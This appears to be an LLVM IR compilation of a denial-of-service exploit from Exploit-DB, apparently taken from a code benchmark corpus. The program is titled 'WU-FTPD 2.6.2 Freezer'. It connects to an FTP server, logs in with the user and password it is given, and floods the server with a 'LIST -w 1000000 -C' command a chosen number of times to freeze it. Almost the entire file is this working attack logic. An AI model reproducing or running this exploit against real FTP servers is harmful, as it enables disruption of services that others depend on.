; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_115.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_115.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { i32 }
%struct.sockaddr = type { i32 }

@stdout = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [29 x i8] c"\0A(c) Rosiello Security 2003\0A\00", align 1
@.str.1 = private unnamed_addr constant [25 x i8] c"http://www.rosiello.org\0A\00", align 1
@.str.2 = private unnamed_addr constant [43 x i8] c"WU-FTPD 2.6.2 Freezer by Angelo Rosiello\0A\0A\00", align 1
@.str.3 = private unnamed_addr constant [9 x i8] c"USER %s\0A\00", align 1
@.str.4 = private unnamed_addr constant [9 x i8] c"PASS %s\0A\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@.str.5 = private unnamed_addr constant [36 x i8] c"Something wrong with the connection\00", align 1
@.str.6 = private unnamed_addr constant [3 x i8] c"%c\00", align 1
@.str.7 = private unnamed_addr constant [47 x i8] c"Connection executed, now waiting to log in...\0A\00", align 1
@.str.8 = private unnamed_addr constant [3 x i8] c"%s\00", align 1
@.str.9 = private unnamed_addr constant [23 x i8] c"Sending the DoS query\0A\00", align 1
@.str.10 = private unnamed_addr constant [20 x i8] c"LIST -w 1000000 -C\0A\00", align 1
@.str.11 = private unnamed_addr constant [10 x i8] c"All done\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca [30 x i8], align 16
  %12 = alloca [30 x i8], align 16
  %13 = alloca i8, align 1
  %14 = alloca %struct.sockaddr_in, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %15 = load i32, i32* @stdout, align 4
  %16 = call i32 @fprintf(i32 %15, i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str, i64 0, i64 0))
  %17 = load i32, i32* @stdout, align 4
  %18 = call i32 @fprintf(i32 %17, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.1, i64 0, i64 0))
  %19 = load i32, i32* @stdout, align 4
  %20 = call i32 @fprintf(i32 %19, i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.2, i64 0, i64 0))
  %21 = load i32, i32* %4, align 4
  %22 = icmp ne i32 %21, 6
  br i1 %22, label %23, label %28

23:                                               ; preds = %2
  %24 = load i8**, i8*** %5, align 8
  %25 = getelementptr inbounds i8*, i8** %24, i64 0
  %26 = load i8*, i8** %25, align 8
  %27 = call i32 @usage(i8* %26)
  br label %28

28:                                               ; preds = %23, %2
  %29 = load i8**, i8*** %5, align 8
  %30 = getelementptr inbounds i8*, i8** %29, i64 3
  %31 = load i8*, i8** %30, align 8
  %32 = call i32 @strlen(i8* %31)
  %33 = icmp sgt i32 %32, 20
  br i1 %33, label %34, label %36

34:                                               ; preds = %28
  %35 = call i32 @exit(i32 0) #3
  unreachable

36:                                               ; preds = %28
  %37 = load i8**, i8*** %5, align 8
  %38 = getelementptr inbounds i8*, i8** %37, i64 4
  %39 = load i8*, i8** %38, align 8
  %40 = call i32 @strlen(i8* %39)
  %41 = icmp sgt i32 %40, 20
  br i1 %41, label %42, label %44

42:                                               ; preds = %36
  %43 = call i32 @exit(i32 0) #3
  unreachable

44:                                               ; preds = %36
  %45 = getelementptr inbounds [30 x i8], [30 x i8]* %11, i64 0, i64 0
  %46 = load i8**, i8*** %5, align 8
  %47 = getelementptr inbounds i8*, i8** %46, i64 3
  %48 = load i8*, i8** %47, align 8
  %49 = call i32 @sprintf(i8* %45, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.3, i64 0, i64 0), i8* %48)
  %50 = getelementptr inbounds [30 x i8], [30 x i8]* %12, i64 0, i64 0
  %51 = load i8**, i8*** %5, align 8
  %52 = getelementptr inbounds i8*, i8** %51, i64 4
  %53 = load i8*, i8** %52, align 8
  %54 = call i32 @sprintf(i8* %50, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.4, i64 0, i64 0), i8* %53)
  %55 = load i8**, i8*** %5, align 8
  %56 = getelementptr inbounds i8*, i8** %55, i64 2
  %57 = load i8*, i8** %56, align 8
  %58 = call i32 @atoi(i8* %57)
  store i32 %58, i32* %8, align 4
  %59 = load i8**, i8*** %5, align 8
  %60 = getelementptr inbounds i8*, i8** %59, i64 5
  %61 = load i8*, i8** %60, align 8
  %62 = call i32 @atoi(i8* %61)
  store i32 %62, i32* %9, align 4
  %63 = load i32, i32* %8, align 4
  %64 = load i8**, i8*** %5, align 8
  %65 = getelementptr inbounds i8*, i8** %64, i64 1
  %66 = load i8*, i8** %65, align 8
  %67 = call i64 @inet_addr(i8* %66)
  %68 = call i32 @addr_initialize(%struct.sockaddr_in* %14, i32 %63, i64 %67)
  %69 = load i32, i32* @AF_INET, align 4
  %70 = load i32, i32* @SOCK_STREAM, align 4
  %71 = call i32 @socket(i32 %69, i32 %70, i32 0)
  store i32 %71, i32* %7, align 4
  %72 = load i32, i32* %7, align 4
  %73 = bitcast %struct.sockaddr_in* %14 to %struct.sockaddr*
  %74 = call i32 @connect(i32 %72, %struct.sockaddr* %73, i32 4)
  store i32 %74, i32* %10, align 4
  %75 = load i32, i32* %10, align 4
  %76 = icmp ne i32 %75, 0
  br i1 %76, label %77, label %80

77:                                               ; preds = %44
  %78 = call i32 @perror(i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.5, i64 0, i64 0))
  %79 = call i32 @exit(i32 0) #3
  unreachable

80:                                               ; preds = %44
  br label %81

81:                                               ; preds = %85, %80
  %82 = load i8, i8* %13, align 1
  %83 = sext i8 %82 to i32
  %84 = icmp ne i32 %83, 10
  br i1 %84, label %85, label %91

85:                                               ; preds = %81
  %86 = load i32, i32* %7, align 4
  %87 = call i32 @recv(i32 %86, i8* %13, i32 1, i32 0)
  %88 = load i8, i8* %13, align 1
  %89 = sext i8 %88 to i32
  %90 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.6, i64 0, i64 0), i32 %89)
  br label %81

91:                                               ; preds = %81
  store i8 0, i8* %13, align 1
  %92 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.7, i64 0, i64 0))
  %93 = getelementptr inbounds [30 x i8], [30 x i8]* %11, i64 0, i64 0
  %94 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.8, i64 0, i64 0), i8* %93)
  %95 = load i32, i32* %7, align 4
  %96 = getelementptr inbounds [30 x i8], [30 x i8]* %11, i64 0, i64 0
  %97 = getelementptr inbounds [30 x i8], [30 x i8]* %11, i64 0, i64 0
  %98 = call i32 @strlen(i8* %97)
  %99 = call i32 @send(i32 %95, i8* %96, i32 %98, i32 0)
  br label %100

100:                                              ; preds = %104, %91
  %101 = load i8, i8* %13, align 1
  %102 = sext i8 %101 to i32
  %103 = icmp ne i32 %102, 10
  br i1 %103, label %104, label %110

104:                                              ; preds = %100
  %105 = load i32, i32* %7, align 4
  %106 = call i32 @recv(i32 %105, i8* %13, i32 1, i32 0)
  %107 = load i8, i8* %13, align 1
  %108 = sext i8 %107 to i32
  %109 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.6, i64 0, i64 0), i32 %108)
  br label %100

110:                                              ; preds = %100
  %111 = getelementptr inbounds [30 x i8], [30 x i8]* %12, i64 0, i64 0
  %112 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.8, i64 0, i64 0), i8* %111)
  store i8 0, i8* %13, align 1
  %113 = load i32, i32* %7, align 4
  %114 = getelementptr inbounds [30 x i8], [30 x i8]* %12, i64 0, i64 0
  %115 = getelementptr inbounds [30 x i8], [30 x i8]* %12, i64 0, i64 0
  %116 = call i32 @strlen(i8* %115)
  %117 = call i32 @send(i32 %113, i8* %114, i32 %116, i32 0)
  br label %118

118:                                              ; preds = %122, %110
  %119 = load i8, i8* %13, align 1
  %120 = sext i8 %119 to i32
  %121 = icmp ne i32 %120, 10
  br i1 %121, label %122, label %128

122:                                              ; preds = %118
  %123 = load i32, i32* %7, align 4
  %124 = call i32 @recv(i32 %123, i8* %13, i32 1, i32 0)
  %125 = load i8, i8* %13, align 1
  %126 = sext i8 %125 to i32
  %127 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.6, i64 0, i64 0), i32 %126)
  br label %118

128:                                              ; preds = %118
  %129 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.9, i64 0, i64 0))
  store i32 0, i32* %6, align 4
  br label %130

130:                                              ; preds = %137, %128
  %131 = load i32, i32* %6, align 4
  %132 = load i32, i32* %9, align 4
  %133 = icmp slt i32 %131, %132
  br i1 %133, label %134, label %140

134:                                              ; preds = %130
  %135 = load i32, i32* %7, align 4
  %136 = call i32 @write(i32 %135, i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.10, i64 0, i64 0), i32 19)
  br label %137

137:                                              ; preds = %134
  %138 = load i32, i32* %6, align 4
  %139 = add nsw i32 %138, 1
  store i32 %139, i32* %6, align 4
  br label %130

140:                                              ; preds = %130
  %141 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.11, i64 0, i64 0))
  %142 = load i32, i32* %7, align 4
  %143 = call i32 @close(i32 %142)
  ret i32 0
}

declare dso_local i32 @fprintf(i32, i8*) #1

declare dso_local i32 @usage(i8*) #1

declare dso_local i32 @strlen(i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @sprintf(i8*, i8*, i8*) #1

declare dso_local i32 @atoi(i8*) #1

declare dso_local i32 @addr_initialize(%struct.sockaddr_in*, i32, i64) #1

declare dso_local i64 @inet_addr(i8*) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @connect(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @perror(i8*) #1

declare dso_local i32 @recv(i32, i8*, i32, i32) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @send(i32, i8*, i32, i32) #1

declare dso_local i32 @write(i32, i8*, i32) #1

declare dso_local i32 @close(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
